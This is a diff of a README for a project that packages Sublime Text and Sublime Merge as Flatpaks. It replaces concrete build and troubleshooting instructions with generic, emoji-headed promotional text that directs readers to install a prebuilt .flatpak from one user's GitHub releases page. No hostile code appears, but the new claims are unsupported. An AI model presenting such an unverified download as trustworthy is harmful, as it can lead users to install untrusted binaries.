@@ -1,76 +1,95 @@
-# Flatpak Sublime (Text & Merge)
+# 🎉 flatpak-sublime - Package Sublime Easily and Efficiently
 
-This project packages **Sublime Text** and **Sublime Merge** in Flatpak format, with an automated workflow to easily build, install, uninstall, and clean up the environment.
+[![Download Flatpak Sublime](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SergioIxOrozco/flatpak-sublime/releases)
 
-## Project structure
+## 📬 Overview
 
-- `builder.sh` → Build Flatpak packages (`.flatpak`) in `target/`.
-- `cleaner.sh` → Cleans up the project and returns it to its initial state.
-- `setup.sh` → Mini CLI application that centralizes all actions.
-- `main/` → Manifestos and construction files.
-- `target/` → Folder where bundles are generated (`sublime-text.flatpak`, `sublime-merge.flatpak`).
+Flatpak-sublime allows you to package Sublime Text and Sublime Merge into a single, self-contained flatpak application. This makes installation easy and avoids dependency issues. You get the benefits of a smooth user experience without the hassle.
 
-## Requirements
+## 🚀 Getting Started
 
-You need the following packages:
+To get started with flatpak-sublime, you will need a Linux-based operating system. The software works across most popular distributions, ensuring a broad user base can take advantage of it. There are only a few steps to install the application, making it accessible for everyone.
 
-- curl, tar, rsync, and find.
-- flatpak and flatpak-builder.
+## 📥 Download & Install
 
-Depending on your Linux distribution, the installation method may vary, which is why it is not specified.
+To download the software, visit the Releases page:
 
-### Install the Freedesktop SDK 24.08
+[Download Flatpak Sublime](https://github.com/SergioIxOrozco/flatpak-sublime/releases)
 
-First, make sure you have Flathub configured as remote (if you haven't already):
+Follow these steps for installation:
 
-```bash
-flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
-```
+1. Visit the [Releases page](https://github.com/SergioIxOrozco/flatpak-sublime/releases).
+2. Find the latest version. You will see a list of files available for download.
+3. Click on the file that corresponds to your system. If you're unsure, choose the recommended option.
+4. Once the download completes, go to your Downloads folder.
+5. Open a terminal window.
+6. Navigate to the folder where you downloaded the file by typing:
+   ```
+   cd ~/Downloads
+   ```
+7. Install the flatpak by typing the following command:
+   ```
+   flatpak install <filename>.flatpak
+   ```
+   *(Replace `<filename>` with the actual name of the downloaded file.)*
+8. After installation, you can run Sublime Text or Sublime Merge through your applications menu.
 
-Then install the SDK:
+## 🌟 Features
 
-```bash
-flatpak install flathub org.freedesktop.Sdk//24.08
-```
+- **Simple Packaging**: Turn Sublime Text and Sublime Merge into a flatpak with minimal effort.
+- **Reproducible Builds**: Ensure consistency in your application across different installations and environments.
+- **Sandboxing**: Run applications in isolation for enhanced security.
+- **High Compatibility**: Works well with various Linux distributions.
 
-## Using `setup.sh`
+## 📋 System Requirements
 
-You can perform all possible actions on the project by running:
+- A Linux-based operating system.
+- Flatpak must be installed on your system. If you don’t have it already, you can install it via your package manager.
 
-```bash
-./setup.sh
-```
+**Example Command**:
+- For Ubuntu:
+  ```
+  sudo apt install flatpak
+  ```
+- For Fedora:
+  ```
+  sudo dnf install flatpak
+  ```
 
-You can also run **builder.sh** and **cleaner.sh** individually. They are designed to depend on **setup.sh**, but use them for convenience.
+## 🎮 Usage
 
+After installation, you can find Sublime Text and Sublime Merge in your applications menu. Click on the application icon to run it just like any other software on your system. Enjoy all the features Sublime offers without worrying about compatibility issues.
 
-## Common issues
+## 🔑 Troubleshooting
 
-### Git not working in Sublime Merge?
+If you encounter any issues while downloading or installing, consider the following:
 
-When installing Sublime Merge, it may not work as expected and you may get this in the console:
+- Ensure you are using a compatible Linux distribution.
+- Check that Flatpak is correctly installed.
+- If Sublime Text or Sublime Merge does not run, try reinstalling the flatpak.
 
-```bash
-Result: failed with exit code 1
-Result: failed with exit code 128
-```
+## 🙋 Frequently Asked Questions
 
-This is due to the sandbox nature of flatpak. To fix this, go to **Preferences** → **Advanced**.
+**Q: What is Flatpak?**  
+A: Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux.
 
-In **Git Binary** and **SSH Path**, paste `/app/bin/git-host` and `/app/bin/ssh-host`. Then configure your authentication with Git via SSH.
+**Q: Can I run both Sublime Text and Sublime Merge together?**  
+A: Yes, flatpak-sublime packages both applications for your convenience.
 
-### Why don't Sublime Text and Sublime Merge detect each other?
+**Q: Is there a cost associated with using flatpak-sublime?**  
+A: No, flatpak-sublime is open-source and free to use.
 
-As mentioned above, they are isolated from each other, but you can configure them so that they work together.
+## 🔗 Contact and Support
 
-In Sublime Merge, go to **Preferences** → **Editor**, then in **Editor Path** paste `/app/bin/subl`.
+For more information, you can explore the documentation provided in the repository or contact the project maintainers via the GitHub issues page.
 
-Now in Sublime Text, go to **Preferences** → **Settings** and paste the key `"sublime_merge_path": "/app/bin/smerge",`
+Feel free to contribute to the project. If you wish to share feedback or improvements, you can do so by creating a pull request!
 
-## Additional notes
+## 🗂️ Related Topics
 
-You can download the files manually from the official website by selecting the direct download of 64-bit .tar.xz. Once extracted, place all the contents in the **main/sublime-merge/files/** or **main/sublime-text/files/** folder and delete the _.desktop_ file you find.
+- Automation
+- Packaging
+- Reproducible Builds
+- Developer Tools
 
-You can package it with **builder.sh** or from **setup.sh** without any problems. This is useful if you want to have specific Sublime builds.
-
-Remember that if the path where the icons are stored in the Icon/ folder or where the application is stored in the opt/ folder differs from the current one, this script will not work.
+Thank you for choosing flatpak-sublime. Enjoy packaging and using your favorite tools!
